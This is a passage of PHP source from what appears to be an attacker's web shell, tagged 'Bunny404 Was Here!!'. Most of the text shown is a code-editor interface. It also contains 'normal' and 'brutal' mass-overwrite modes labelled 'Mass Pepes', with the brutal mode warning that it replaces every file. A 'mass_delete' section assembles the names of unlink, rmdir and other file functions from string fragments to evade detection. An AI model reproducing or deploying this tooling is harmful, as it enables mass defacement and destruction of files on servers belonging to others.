                <option>base16/twilight.min.css</option>
                <option>base16/unikitty-dark.min.css</option>
                <option>base16/unikitty-light.min.css</option>
                <option>base16/vulcan.min.css</option>
                <option>base16/windows-10-light.min.css</option>
                <option>base16/windows-10.min.css</option>
                <option>base16/windows-95-light.min.css</option>
                <option>base16/windows-95.min.css</option>
                <option>base16/windows-high-contrast-light.min.css</option>
                <option>base16/windows-high-contrast.min.css</option>
                <option>base16/windows-nt-light.min.css</option>
                <option>base16/windows-nt.min.css</option>
                <option>base16/woodland.min.css</option>
                <option>base16/xcode-dusk.min.css</option>
                <option>base16/zenburn.min.css</option>
            </select><br><br>
            <span>Font:</span>
            <select id="selectFont" class="bg-black">
                <option>Roboto Mono</option>
                <option>Consolas</option>
                <option>Cascadia Mono</option>
                <option>Inconsolata</option>
                <option>Source Code Pro</option>
                <option>IBM Plex Mono</option>
                <option>Space Mono</option>
                <option>PT Mono</option>
                <option>Ubuntu Mono</option>
                <option>Nanum Gothic Coding</option>
                <option>Cousine</option>
                <option>Fira Mono</option>
                <option>Share Tech Mono</option>
                <option>Courier Prime</option>
                <option>Anonymous Pro</option>
                <option>Cutive Mono</option>
                <option>VT323</option>
                <option>JetBrains Mono</option>
                <option>Noto Sans Mono</option>
                <option>Red Hat Mono</option>
                <option>Martian Mono</option>
                <option>Major Mono Display</option>
                <option>Nova Mono</option>
                <option>Syne Mono</option>
                <option>Xanh Mono</option>
                <option>Monofett</option>
            </select><br><br>
            <span>Font Size (pt):</span>
            <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
            <span>Language:</span>
            <select id="selectLanguage" class="bg-black">
                <option value="language-html">HTML</option>
                <option value="language-javascript">JavaScript</option>
                <option value="language-python">Python</option>
                <option value="language-java">Java</option>
                <option value="language-csharp">C#</option>
                <option value="language-php">PHP</option>
                <option value="language-cpp">C++</option>
                <option value="language-typescript">TypeScript</option>
                <option value="language-ruby">Ruby</option>
            </select><br><br>
            <div id="divCodeWrapper">
                <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
                <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="Bunny404 Was Here!!"></textarea>
            </div>
            <script type="text/javascript">
            const textarea1 = document.getElementById("textarea1");
            const codeBlock = document.getElementById("codeBlock");
            let content = textarea1.value;
            content = content.replace(/&/g, "&amp;");
            content = content.replace(/</g, "&lt;");
            content = content.replace(/>/g, "&gt;");
            codeBlock.innerHTML = content;
            highlightJS();
    
            function updateCode() {
                let content = textarea1.value;
                content = content.replace(/&/g, "&amp;");
                content = content.replace(/</g, "&lt;");
                content = content.replace(/>/g, "&gt;");
                codeBlock.innerHTML = content;
                highlightJS();
            }
    
            function highlightJS() {
                document.querySelectorAll("pre code").forEach((el) => {
                    hljs.highlightElement(el);
                });
            }
    
            textarea1.addEventListener("input", () => {
                updateCode();
            });
    
            textarea1.addEventListener("scroll", () => {
                codeBlock.scrollTop = textarea1.scrollTop;
                codeBlock.scrollLeft = textarea1.scrollLeft;
            });
    
            textarea1.addEventListener("keydown", function (e) {
                if (e.key === "Enter") {
                    e.preventDefault();
                    var cursorPos = textarea1.selectionStart;
                    var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
                    var indent = prevLine.match(/^\s*/)[0];
                    textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
                    textarea1.blur();
                    textarea1.focus();
                    updateCode();
                    return;
                }
                if (e.key === "Tab" && !e.shiftKey &&
                    textarea1.selectionStart == textarea1.selectionEnd) {
                    e.preventDefault();
                    let cursorPosition = textarea1.selectionStart;
                    let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
                        textarea1.value.substring(cursorPosition);
                    textarea1.value = newValue;
                    textarea1.selectionStart = cursorPosition + 4;
                    textarea1.selectionEnd = cursorPosition + 4;    
                    updateCode();
                    return;
                }
    
                if (e.key === "Tab" && e.shiftKey &&
    
                    textarea1.selectionStart == textarea1.selectionEnd) {
    
                    e.preventDefault();
    
                    let cursorPosition = textarea1.selectionStart;
                    let leadingSpaces = 0;
                    for (let i = 0; i < 4; i++) {
                        if (textarea1.value[cursorPosition - i - 1] === " ") {
                            leadingSpaces++;
                        } else {
                            break;
                        }
                    }
    
                    if (leadingSpaces > 0) {
                        let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
                            textarea1.value.substring(cursorPosition);
                        textarea1.value = newValue;
                        textarea1.selectionStart = cursorPosition - leadingSpaces;
                        textarea1.selectionEnd = cursorPosition - leadingSpaces;
                    }
    
                    updateCode();
                    return;
                }
    
                if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
                    e.preventDefault();
                    let lines = this.value.split("\n");
    
                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
    
                    let spacesRemovedFirstLine = 0;
                    let spacesRemoved = 0;
    
                    if (e.shiftKey) {
                        for (let i = startPos; i <= endPos; i++) {
                            lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
                                if (i == startPos)
                                    spacesRemovedFirstLine = match.length;
                                spacesRemoved += match.length;
    
                                return "";
                            });
                        }
                    } else {
                        for (let i = startPos; i <= endPos; i++) {
                            lines[i] = "    " + lines[i];
                        }
                    }
                    let start = this.selectionStart;
                    let end = this.selectionEnd;
                    this.value = lines.join("\n");
                    this.selectionStart = e.shiftKey ?
                        start - spacesRemovedFirstLine : start + 4;
                    this.selectionEnd = e.shiftKey ?
                        end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
                    updateCode();
                    return;
                }
                if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
    
                    e.preventDefault();
                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
                    let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
                    let cursorPosInLine = cursorLine.length;
                    let totalLinesRemove = endPos - startPos + 1;
                    let lines = this.value.split("\n");
                    let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
                    lines.splice(startPos, totalLinesRemove);
                    let newLine = lines[startPos] || "";
                    if (newLine.length < cursorPosInLine) {
                        cursorPosInLine = newLine.length;
                    }
                    newStart += cursorPosInLine;
    
                    this.value = lines.join("\n");
                    this.selectionStart = this.selectionEnd = newStart; 
                    updateCode();
                    return;
                }
    
                if (e.key === "Home") {
                    let line = this.value.substring(0, this.selectionStart).split("\n").pop();
                    let cursorPosInLine = line.length;
                    let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
                    let firstNonWhitespacePos = line.search(/\S/);
                    if (firstNonWhitespacePos >= cursorPosInLine) {
                        return true;
                    }
                    else if (firstNonWhitespacePos === -1) {
                        return true;
                    }
                    e.preventDefault();
                    this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
                    return;
                }
            });
    
            document.getElementById("selectStyle").addEventListener("change", (e) => {
                document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
            });
    
            function updateFont() {
                let selectFont = document.getElementById("selectFont");
                let fontName = selectFont.options[selectFont.selectedIndex].text;
                let fontNameUrl = fontName.replace(" ", "+");
                let inputFontSize = document.getElementById("inputFontSize");
                document.getElementById("style2").textContent = `
                @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
                pre, code, textarea {
                    font-family: "${fontName}", monospace !important;
                    font-size: ${inputFontSize.value}pt !important;
                }`;
            }
    
            document.getElementById("selectLanguage").addEventListener("change", function () {
                document.getElementById("codeBlock").className = this.value;
                highlightJS();
            });
    
            document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });

            document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
            </script>
            ';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-normal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Pepes</button>';
                echo '</form>';
            } elseif ($mode === $brutal) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtRed . ' font-medium">' . strtoupper($mode) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Mode Selected!</font></span>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Path <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="gasteruspath">
                    </label>';
                echo '<label class="block">
                    <span class="block ' . $txtBlue . ' font-medium">Filename <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                    <span class="block ' . $txtRed . '">(<font class="' . $txtYellow . ' font-bold">WARNING</font>) This GASSPOLL All Files! <font class="' . $txtYellow . ' font-bold">DANGEROUS!</font></span>
                    </label>';
                echo '
                    <style type="text/css">
                    @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");

                    #divCodeWrapper {
                        height: 80vh;
                        width: 100%;
                        overflow: hidden;
                        border: 1px solid #a5a5a5;
                        position: relative;
                    }

                    #preCode {
                        height: 100%;
                        width: 100%;
                        position: absolute;
                        top: 0;
                        left: 0;
                        overflow: hidden;
                        padding: 0;
                        margin: 0;
                        background: #1b1b1b;
                    }

                        #preCode code {
                            padding: 15px;
                            height: calc(100% - 30px);
                            width: calc(100% - 30px);
                            font-family: "Roboto Mono", monospace;
                            font-weight: 400;
                            font-size: 12pt;
                            line-height: 150%;
                            overflow-y: scroll;
                            overflow-x: auto;
                        }

                    textarea {
                        font-family: "Roboto Mono", monospace;
                        font-weight: 400;
                        font-size: 12pt;
                        line-height: 150%;
                        position: absolute;
                        top: 0;
                        left: 0;
                        height: calc(100% - 30px);
                        width: calc(100% - 30px);
                        padding: 15px;
                        z-index: 2;
                        overflow-x: auto;
                        overflow-y: scroll;
                        white-space: nowrap;
                        background-color: rgba(0,0,0,0);
                        color: rgba(0,0,0,0);
                        caret-color: white;
                    }
                </style>
                <span class="block ' . $txtBlue . ' font-medium">Filecontent <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
                <span>Theme:</span>
                    <select id="selectStyle" class="bg-black">
                        <option>a11y-dark.min.css</option>
                        <option>a11y-light.min.css</option>
                        <option>agate.min.css</option>
                        <option>an-old-hope.min.css</option>
                        <option>androidstudio.min.css</option>
                        <option>arduino-light.min.css</option>
                        <option>arta.min.css</option>
                        <option>ascetic.min.css</option>
                        <option>atom-one-dark-reasonable.min.css</option>
                        <option>atom-one-dark.min.css</option>
                        <option>atom-one-light.min.css</option>
                        <option>brown-paper.min.css</option>
                        <option>codepen-embed.min.css</option>
                        <option>color-brewer.min.css</option>
                        <option>dark.min.css</option>
                        <option>default.min.css</option>
                        <option>devibeans.min.css</option>
                        <option>docco.min.css</option>
                        <option>far.min.css</option>
                        <option>felipec.min.css</option>
                        <option>foundation.min.css</option>
                        <option>github-dark-dimmed.min.css</option>
                        <option>github-dark.min.css</option>
                        <option>github.min.css</option>
                        <option>gml.min.css</option>
                        <option>googlecode.min.css</option>
                        <option>gradient-dark.min.css</option>
                        <option>gradient-light.min.css</option>
                        <option>grayscale.min.css</option>
                        <option>hybrid.min.css</option>
                        <option>idea.min.css</option>
                        <option>intellij-light.min.css</option>
                        <option>ir-black.min.css</option>
                        <option>isbl-editor-dark.min.css</option>
                        <option>isbl-editor-light.min.css</option>
                        <option>kimbie-dark.min.css</option>
                        <option>kimbie-light.min.css</option>
                        <option>lightfair.min.css</option>
                        <option>lioshi.min.css</option>
                        <option>magula.min.css</option>
                        <option>mono-blue.min.css</option>
                        <option>monokai-sublime.min.css</option>
                        <option>monokai.min.css</option>
                        <option>night-owl.min.css</option>
                        <option>nnfx-dark.min.css</option>
                        <option>nnfx-light.min.css</option>
                        <option>nord.min.css</option>
                        <option>obsidian.min.css</option>
                        <option>panda-syntax-dark.min.css</option>
                        <option>panda-syntax-light.min.css</option>
                        <option>paraiso-dark.min.css</option>
                        <option>paraiso-light.min.css</option>
                        <option>pojoaque.min.css</option>
                        <option>purebasic.min.css</option>
                        <option>qtcreator-dark.min.css</option>
                        <option>qtcreator-light.min.css</option>
                        <option>rainbow.min.css</option>
                        <option>routeros.min.css</option>
                        <option>school-book.min.css</option>
                        <option>shades-of-purple.min.css</option>
                        <option>srcery.min.css</option>
                        <option>stackoverflow-dark.min.css</option>
                        <option>stackoverflow-light.min.css</option>
                        <option>sunburst.min.css</option>
                        <option>tokyo-night-dark.min.css</option>
                        <option>tokyo-night-light.min.css</option>
                        <option>tomorrow-night-blue.min.css</option>
                        <option>tomorrow-night-bright.min.css</option>
                        <option>vs.min.css</option>
                        <option selected>vs2015.min.css</option>
                        <option>xcode.min.css</option>
                        <option>xt256.min.css</option>
                        <option>base16/3024.min.css</option>
                        <option>base16/apathy.min.css</option>
                        <option>base16/apprentice.min.css</option>
                        <option>base16/ashes.min.css</option>
                        <option>base16/atelier-cave-light.min.css</option>
                        <option>base16/atelier-cave.min.css</option>
                        <option>base16/atelier-dune-light.min.css</option>
                        <option>base16/atelier-dune.min.css</option>
                        <option>base16/atelier-estuary-light.min.css</option>
                        <option>base16/atelier-estuary.min.css</option>
                        <option>base16/atelier-forest-light.min.css</option>
                        <option>base16/atelier-forest.min.css</option>
                        <option>base16/atelier-heath-light.min.css</option>
                        <option>base16/atelier-heath.min.css</option>
                        <option>base16/atelier-lakeside-light.min.css</option>
                        <option>base16/atelier-lakeside.min.css</option>
                        <option>base16/atelier-plateau-light.min.css</option>
                        <option>base16/atelier-plateau.min.css</option>
                        <option>base16/atelier-savanna-light.min.css</option>
                        <option>base16/atelier-savanna.min.css</option>
                        <option>base16/atelier-seaside-light.min.css</option>
                        <option>base16/atelier-seaside.min.css</option>
                        <option>base16/atelier-sulphurpool-light.min.css</option>
                        <option>base16/atelier-sulphurpool.min.css</option>
                        <option>base16/atlas.min.css</option>
                        <option>base16/bespin.min.css</option>
                        <option>base16/black-metal-bathory.min.css</option>
                        <option>base16/black-metal-burzum.min.css</option>
                        <option>base16/black-metal-dark-funeral.min.css</option>
                        <option>base16/black-metal-gorgoroth.min.css</option>
                        <option>base16/black-metal-immortal.min.css</option>
                        <option>base16/black-metal-khold.min.css</option>
                        <option>base16/black-metal-marduk.min.css</option>
                        <option>base16/black-metal-mayhem.min.css</option>
                        <option>base16/black-metal-nile.min.css</option>
                        <option>base16/black-metal-venom.min.css</option>
                        <option>base16/black-metal.min.css</option>
                        <option>base16/brewer.min.css</option>
                        <option>base16/bright.min.css</option>
                        <option>base16/brogrammer.min.css</option>
                        <option>base16/brush-trees-dark.min.css</option>
                        <option>base16/brush-trees.min.css</option>
                        <option>base16/chalk.min.css</option>
                        <option>base16/circus.min.css</option>
                        <option>base16/classic-dark.min.css</option>
                        <option>base16/classic-light.min.css</option>
                        <option>base16/codeschool.min.css</option>
                        <option>base16/colors.min.css</option>
                        <option>base16/cupcake.min.css</option>
                        <option>base16/cupertino.min.css</option>
                        <option>base16/danqing.min.css</option>
                        <option>base16/darcula.min.css</option>
                        <option>base16/dark-violet.min.css</option>
                        <option>base16/darkmoss.min.css</option>
                        <option>base16/darktooth.min.css</option>
                        <option>base16/decaf.min.css</option>
                        <option>base16/default-dark.min.css</option>
                        <option>base16/default-light.min.css</option>
                        <option>base16/dirtysea.min.css</option>
                        <option>base16/dracula.min.css</option>
                        <option>base16/edge-dark.min.css</option>
                        <option>base16/edge-light.min.css</option>
                        <option>base16/eighties.min.css</option>
                        <option>base16/embers.min.css</option>
                        <option>base16/equilibrium-dark.min.css</option>
                        <option>base16/equilibrium-gray-dark.min.css</option>
                        <option>base16/equilibrium-gray-light.min.css</option>
                        <option>base16/equilibrium-light.min.css</option>
                        <option>base16/espresso.min.css</option>
                        <option>base16/eva-dim.min.css</option>
                        <option>base16/eva.min.css</option>
                        <option>base16/flat.min.css</option>
                        <option>base16/framer.min.css</option>
                        <option>base16/fruit-soda.min.css</option>
                        <option>base16/gigavolt.min.css</option>
                        <option>base16/github.min.css</option>
                        <option>base16/google-dark.min.css</option>
                        <option>base16/google-light.min.css</option>
                        <option>base16/grayscale-dark.min.css</option>
                        <option>base16/grayscale-light.min.css</option>
                        <option>base16/green-screen.min.css</option>
                        <option>base16/gruvbox-dark-hard.min.css</option>
                        <option>base16/gruvbox-dark-medium.min.css</option>
                        <option>base16/gruvbox-dark-pale.min.css</option>
                        <option>base16/gruvbox-dark-soft.min.css</option>
                        <option>base16/gruvbox-light-hard.min.css</option>
                        <option>base16/gruvbox-light-medium.min.css</option>
                        <option>base16/gruvbox-light-soft.min.css</option>
                        <option>base16/hardcore.min.css</option>
                        <option>base16/harmonic16-dark.min.css</option>
                        <option>base16/harmonic16-light.min.css</option>
                        <option>base16/heetch-dark.min.css</option>
                        <option>base16/heetch-light.min.css</option>
                        <option>base16/helios.min.css</option>
                        <option>base16/hopscotch.min.css</option>
                        <option>base16/horizon-dark.min.css</option>
                        <option>base16/horizon-light.min.css</option>
                        <option>base16/humanoid-dark.min.css</option>
                        <option>base16/humanoid-light.min.css</option>
                        <option>base16/ia-dark.min.css</option>
                        <option>base16/ia-light.min.css</option>
                        <option>base16/icy-dark.min.css</option>
                        <option>base16/ir-black.min.css</option>
                        <option>base16/isotope.min.css</option>
                        <option>base16/kimber.min.css</option>
                        <option>base16/london-tube.min.css</option>
                        <option>base16/macintosh.min.css</option>
                        <option>base16/marrakesh.min.css</option>
                        <option>base16/materia.min.css</option>
                        <option>base16/material-darker.min.css</option>
                        <option>base16/material-lighter.min.css</option>
                        <option>base16/material-palenight.min.css</option>
                        <option>base16/material-vivid.min.css</option>
                        <option>base16/material.min.css</option>
                        <option>base16/mellow-purple.min.css</option>
                        <option>base16/mexico-light.min.css</option>
                        <option>base16/mocha.min.css</option>
                        <option>base16/monokai.min.css</option>
                        <option>base16/nebula.min.css</option>
                        <option>base16/nord.min.css</option>
                        <option>base16/nova.min.css</option>
                        <option>base16/ocean.min.css</option>
                        <option>base16/oceanicnext.min.css</option>
                        <option>base16/one-light.min.css</option>
                        <option>base16/onedark.min.css</option>
                        <option>base16/outrun-dark.min.css</option>
                        <option>base16/papercolor-dark.min.css</option>
                        <option>base16/papercolor-light.min.css</option>
                        <option>base16/paraiso.min.css</option>
                        <option>base16/pasque.min.css</option>
                        <option>base16/phd.min.css</option>
                        <option>base16/pico.min.css</option>
                        <option>base16/pop.min.css</option>
                        <option>base16/porple.min.css</option>
                        <option>base16/qualia.min.css</option>
                        <option>base16/railscasts.min.css</option>
                        <option>base16/rebecca.min.css</option>
                        <option>base16/ros-pine-dawn.min.css</option>
                        <option>base16/ros-pine-moon.min.css</option>
                        <option>base16/ros-pine.min.css</option>
                        <option>base16/sagelight.min.css</option>
                        <option>base16/sandcastle.min.css</option>
                        <option>base16/seti-ui.min.css</option>
                        <option>base16/shapeshifter.min.css</option>
                        <option>base16/silk-dark.min.css</option>
                        <option>base16/silk-light.min.css</option>
                        <option>base16/snazzy.min.css</option>
                        <option>base16/solar-flare-light.min.css</option>
                        <option>base16/solar-flare.min.css</option>
                        <option>base16/solarized-dark.min.css</option>
                        <option>base16/solarized-light.min.css</option>
                        <option>base16/spacemacs.min.css</option>
                        <option>base16/summercamp.min.css</option>
                        <option>base16/summerfruit-dark.min.css</option>
                        <option>base16/summerfruit-light.min.css</option>
                        <option>base16/synth-midnight-terminal-dark.min.css</option>
                        <option>base16/synth-midnight-terminal-light.min.css</option>
                        <option>base16/tango.min.css</option>
                        <option>base16/tender.min.css</option>
                        <option>base16/tomorrow-night.min.css</option>
                        <option>base16/tomorrow.min.css</option>
                        <option>base16/twilight.min.css</option>
                        <option>base16/unikitty-dark.min.css</option>
                        <option>base16/unikitty-light.min.css</option>
                        <option>base16/vulcan.min.css</option>
                        <option>base16/windows-10-light.min.css</option>
                        <option>base16/windows-10.min.css</option>
                        <option>base16/windows-95-light.min.css</option>
                        <option>base16/windows-95.min.css</option>
                        <option>base16/windows-high-contrast-light.min.css</option>
                        <option>base16/windows-high-contrast.min.css</option>
                        <option>base16/windows-nt-light.min.css</option>
                        <option>base16/windows-nt.min.css</option>
                        <option>base16/woodland.min.css</option>
                        <option>base16/xcode-dusk.min.css</option>
                        <option>base16/zenburn.min.css</option>
                    </select><br><br>
                    <span>Font:</span>
                    <select id="selectFont" class="bg-black">
                        <option>Roboto Mono</option>
                        <option>Consolas</option>
                        <option>Cascadia Mono</option>
                        <option>Inconsolata</option>
                        <option>Source Code Pro</option>
                        <option>IBM Plex Mono</option>
                        <option>Space Mono</option>
                        <option>PT Mono</option>
                        <option>Ubuntu Mono</option>
                        <option>Nanum Gothic Coding</option>
                        <option>Cousine</option>
                        <option>Fira Mono</option>
                        <option>Share Tech Mono</option>
                        <option>Courier Prime</option>
                        <option>Anonymous Pro</option>
                        <option>Cutive Mono</option>
                        <option>VT323</option>
                        <option>JetBrains Mono</option>
                        <option>Noto Sans Mono</option>
                        <option>Red Hat Mono</option>
                        <option>Martian Mono</option>
                        <option>Major Mono Display</option>
                        <option>Nova Mono</option>
                        <option>Syne Mono</option>
                        <option>Xanh Mono</option>
                        <option>Monofett</option>
                    </select><br><br>
                    <span>Font Size (pt):</span>
                    <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
                    <span>Language:</span>
                    <select id="selectLanguage" class="bg-black">
                        <option value="language-html">HTML</option>
                        <option value="language-javascript">JavaScript</option>
                        <option value="language-python">Python</option>
                        <option value="language-java">Java</option>
                        <option value="language-csharp">C#</option>
                        <option value="language-php">PHP</option>
                        <option value="language-cpp">C++</option>
                        <option value="language-typescript">TypeScript</option>
                        <option value="language-ruby">Ruby</option>
                    </select><br><br>
                    <div id="divCodeWrapper">
                        <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
                        <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="Bunny404 Was Here!!"></textarea>
                    </div>
                    <script type="text/javascript">
                    const textarea1 = document.getElementById("textarea1");
                    const codeBlock = document.getElementById("codeBlock");
                    let content = textarea1.value;
                    content = content.replace(/&/g, "&amp;");
                    content = content.replace(/</g, "&lt;");
                    content = content.replace(/>/g, "&gt;");
                    codeBlock.innerHTML = content;
                    highlightJS();

                    function updateCode() {
                        let content = textarea1.value;
                        content = content.replace(/&/g, "&amp;");
                        content = content.replace(/</g, "&lt;");
                        content = content.replace(/>/g, "&gt;");
                        codeBlock.innerHTML = content;
                        highlightJS();
                    }

                    function highlightJS() {
                        document.querySelectorAll("pre code").forEach((el) => {
                            hljs.highlightElement(el);
                        });
                    }

                    textarea1.addEventListener("input", () => {
                        updateCode();
                    });

                    textarea1.addEventListener("scroll", () => {
                        codeBlock.scrollTop = textarea1.scrollTop;
                        codeBlock.scrollLeft = textarea1.scrollLeft;
                    });

                    textarea1.addEventListener("keydown", function (e) {
                        if (e.key === "Enter") {
                            e.preventDefault();
                            var cursorPos = textarea1.selectionStart;
                            var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
                            var indent = prevLine.match(/^\s*/)[0];
                            textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
                            textarea1.blur();
                            textarea1.focus();
                            updateCode();
                            return;
                        }
                        if (e.key === "Tab" && !e.shiftKey &&
                            textarea1.selectionStart == textarea1.selectionEnd) {
                            e.preventDefault();
                            let cursorPosition = textarea1.selectionStart;
                            let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
                                textarea1.value.substring(cursorPosition);
                            textarea1.value = newValue;
                            textarea1.selectionStart = cursorPosition + 4;
                            textarea1.selectionEnd = cursorPosition + 4;    
                            updateCode();
                            return;
                        }

                        if (e.key === "Tab" && e.shiftKey &&

                            textarea1.selectionStart == textarea1.selectionEnd) {

                            e.preventDefault();

                            let cursorPosition = textarea1.selectionStart;
                            let leadingSpaces = 0;
                            for (let i = 0; i < 4; i++) {
                                if (textarea1.value[cursorPosition - i - 1] === " ") {
                                    leadingSpaces++;
                                } else {
                                    break;
                                }
                            }

                            if (leadingSpaces > 0) {
                                let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
                                    textarea1.value.substring(cursorPosition);
                                textarea1.value = newValue;
                                textarea1.selectionStart = cursorPosition - leadingSpaces;
                                textarea1.selectionEnd = cursorPosition - leadingSpaces;
                            }

                            updateCode();
                            return;
                        }

                        if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
                            e.preventDefault();
                            let lines = this.value.split("\n");

                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;

                            let spacesRemovedFirstLine = 0;
                            let spacesRemoved = 0;

                            if (e.shiftKey) {
                                for (let i = startPos; i <= endPos; i++) {
                                    lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
                                        if (i == startPos)
                                            spacesRemovedFirstLine = match.length;
                                        spacesRemoved += match.length;

                                        return "";
                                    });
                                }
                            } else {
                                for (let i = startPos; i <= endPos; i++) {
                                    lines[i] = "    " + lines[i];
                                }
                            }
                            let start = this.selectionStart;
                            let end = this.selectionEnd;
                            this.value = lines.join("\n");
                            this.selectionStart = e.shiftKey ?
                                start - spacesRemovedFirstLine : start + 4;
                            this.selectionEnd = e.shiftKey ?
                                end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
                            updateCode();
                            return;
                        }
                        if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {

                            e.preventDefault();
                            let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                            let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
                            let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
                            let cursorPosInLine = cursorLine.length;
                            let totalLinesRemove = endPos - startPos + 1;
                            let lines = this.value.split("\n");
                            let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
                            lines.splice(startPos, totalLinesRemove);
                            let newLine = lines[startPos] || "";
                            if (newLine.length < cursorPosInLine) {
                                cursorPosInLine = newLine.length;
                            }
                            newStart += cursorPosInLine;

                            this.value = lines.join("\n");
                            this.selectionStart = this.selectionEnd = newStart; 
                            updateCode();
                            return;
                        }

                        if (e.key === "Home") {
                            let line = this.value.substring(0, this.selectionStart).split("\n").pop();
                            let cursorPosInLine = line.length;
                            let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
                            let firstNonWhitespacePos = line.search(/\S/);
                            if (firstNonWhitespacePos >= cursorPosInLine) {
                                return true;
                            }
                            else if (firstNonWhitespacePos === -1) {
                                return true;
                            }
                            e.preventDefault();
                            this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
                            return;
                        }
                    });

                    document.getElementById("selectStyle").addEventListener("change", (e) => {
                        document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
                    });

                    function updateFont() {
                        let selectFont = document.getElementById("selectFont");
                        let fontName = selectFont.options[selectFont.selectedIndex].text;
                        let fontNameUrl = fontName.replace(" ", "+");
                        let inputFontSize = document.getElementById("inputFontSize");
                        document.getElementById("style2").textContent = `
                        @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
                        pre, code, textarea {
                            font-family: "${fontName}", monospace !important;
                            font-size: ${inputFontSize.value}pt !important;
                        }`;
                    }

                    document.getElementById("selectLanguage").addEventListener("change", function () {
                        document.getElementById("codeBlock").className = this.value;
                        highlightJS();
                    });

                    document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });

                    document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
                    </script>
                    ';
                echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
                echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Pepes</button>';
                echo '</form>';
            } else {
                echo '<span style="display: none;">Bunny404 Was Here!!</span>';
            }
        }
    }

    if (isset($_GET['mass_delete'])) {
        $f_exist = 'fi' . 'le_' . 'ex' . 'is' . 'ts';
        $is_d = 'is' . '_' . 'd' . 'i' . 'r';
        $is_f = 'is' . '_' . 'f' . 'i' . 'l' . 'e';
        $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
        $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
        $d_name = 'di' . 'r' . 'na' . 'm' . 'e';
        $unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
        $glb = 'g' . 'l' . 'o' . 'b';
        $rm_d = 'r' . 'm' . 'd' . 'i' . 'r';
        $scn_d = 'sc' . 'an' . 'd' . 'ir';
        $opn_d = 'op' . 'e' . 'nd' . 'ir';
        $r_d = 'r' . 'ea' . 'dd' . 'ir';
